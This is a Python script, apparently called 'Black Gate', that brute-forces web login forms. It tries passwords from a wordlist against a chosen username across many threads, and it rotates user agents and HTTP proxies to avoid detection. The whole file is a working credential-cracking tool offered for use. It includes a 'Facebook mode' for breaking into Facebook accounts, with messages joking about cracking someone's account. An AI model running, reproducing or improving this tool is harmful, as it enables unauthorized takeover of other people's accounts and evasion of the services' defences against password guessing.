USERNAME = ''
PASSWORDS = ''
SEARCH_FOR = ''
TARGET = ''
USER_FIELD = ''
PASS_FIELD = ''
USERAGENTS = ''
STOP_ATTACK = False
USE_PROX = False 
PROXYES = ''
FACEBOOK_MODE = False
logo = """
 ____  __     __    ___  __ _     ___   __  ____  ____ 
(  _ \(  )   / _\  / __)(  / )   / __) / _\(_  _)(  __)
 ) _ (/ (_/\/    \( (__  )  (   ( (_ \/    \ )(   ) _)   [Coded by LegalPirate]
(____/\____/\_/\_/ \___)(__\_)   \___/\_/\_/(__) (____)

Remember use this tool at your own risk! 

Password bruterforcer
v0.4
[+]Multi threaded
[+]User-agent support
[+]Proxy support
"""


def Prox():

               exit(0)
def attack():
       global USERNAME
       global PASSWORDS
       global SEARCH_FOR
       global TARGET
       global USER_FIELD
       global PASS_FIELD
       global STOP_ATTACK
       global USERAGENTS
       global PROXYES
       global FACEBOOK_MODE

       import mechanize
       import os
       import cookielib
       import random
       
       br = mechanize.Browser()
       cj = cookielib.LWPCookieJar()
       if USE_PROX == True:
               up = random.choice(PROXYES)
               br.set_proxies({'http':up})
               print("Using proxy: %s") % up
       br.set_handle_robots(False)
       br.set_handle_equiv(True)
       br.set_handle_referer(True)
       br.set_handle_redirect(True)
       br.set_cookiejar(cj)
       br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
       br.addheaders = [('User-agent',random.choice(USERAGENTS))]
       passes = len(PASSWORDS)

       while passes != 0:
         if STOP_ATTACK == True:
                   exit(0)
         try:
           trypass = random.choice(PASSWORDS)
         except:
           exit(0)
         PASSWORDS.remove(trypass)
         try:
           br.open(TARGET)
           br.select_form(nr=0) 
           br.form[USER_FIELD] = USERNAME
           br.form[PASS_FIELD] = trypass
           br.submit()
           count = 0
         except:
           if USE_PROX == True:
                   print("[-]Thread got terminated!\nI think because of the proxy so check them!")
                   exit(0)
         print ('Trying: %s       %s') % (trypass,br.geturl())
         if FACEBOOK_MODE == True:
              if 'https://www.facebook.com/login.php?login_attempt=1' != br.geturl():
                       STOP_ATTACK = True
                       print('[+]Password -------> %s') % trypass     
         if FACEBOOK_MODE == False:
                if SEARCH_FOR in br.response().read():
                      STOP_ATTACK = True
                      print('[+]Password -------> %s') % trypass      
       

def main():
    global USERNAME
    global PASSWORDS
    global SEARCH_FOR
    global TARGET
    global USER_FIELD
    global PASS_FIELD
    global USERAGENTS
    global USE_PROX
    global logo
    global FACEBOOK_MODE

    import os
    os.system('clear')
    print logo
    
    TARGET = raw_input("Give me a target site: ")
    if 'facebook' in TARGET:
       print("[+]As i see you try to crack a Facebook account :)")
       print("[0]This program sometimes can crack facebook but it depends on luck")
       print("[0]In Facebook mode use https://www.facebook.com/login/ as target site!")
       print("[0]In the Give me a string that is only.. part enter something nevermind what :D")
       print("[+]Activating Facebook mode!")
       FACEBOOK_MODE = True
    USERNAME = raw_input('Username: ')
    P_LIST = raw_input("Password list: ")
    USER_FIELD = raw_input('Username field name: ')
    PASS_FIELD = raw_input('Password field name: ')
    PASSWORDS = open(P_LIST).read().split('\n')
    SEARCH_FOR = raw_input('Give me a string that is only visible when the login was succesful: ')
    threadnum = input('How many threads to use? ')
    if threadnum > len(PASSWORDS):
                 print('Why to start so many threads when you have only %s passwords i will start %s threads') % (len(PASSWORDS),len(PASSWORDS))
                 threadnum = len(PASSWORDS)-1
    import threading
    USERAGENTS = open('useragents.lst').read().split('\n')
    try:
     up = raw_input('Use proxies?y/N ')
     if up.lower()  == 'y':
               global  PROXYES
               prox_file = raw_input("Name of file containing HTTP proxies: ")
               PROXYES = open(prox_file).read().split()
               USE_PROX = True
    except:
               USE_PROX = False
    count = 0
    if USE_PROX == True: 
      print ("[+]Starting threads with proxy support!")
    elif USE_PROX == False:
      print ("[+]Starting threads without proxyes!")
      
    while count != threadnum:
         try:
          t = threading.Thread(target=attack)
          t.start()
          print "[+]Thread %s started" % count
         except:
           print "[-]Failed to start thread %s" % count
         count+=1

if __name__ == "__main__":
  main()
